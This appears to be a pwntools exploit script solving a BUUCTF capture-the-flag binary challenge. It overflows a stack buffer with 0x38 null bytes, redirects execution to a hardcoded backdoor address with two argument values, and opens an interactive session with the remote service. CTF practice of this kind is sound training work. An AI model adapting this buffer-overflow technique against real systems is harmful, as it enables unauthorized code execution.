from pwn import*
p = process('./main')
p = remote('node3.buuoj.cn',29938)
context.log_level ='DEBUG'
backdoor = 0x80489A0
payload = '\x00'*0x38 + p32(backdoor) + p32(0x804E6A0) + p32(0x308CD64F)  + p32(0x195719D1)
p.sendline(payload)
p.interactive()
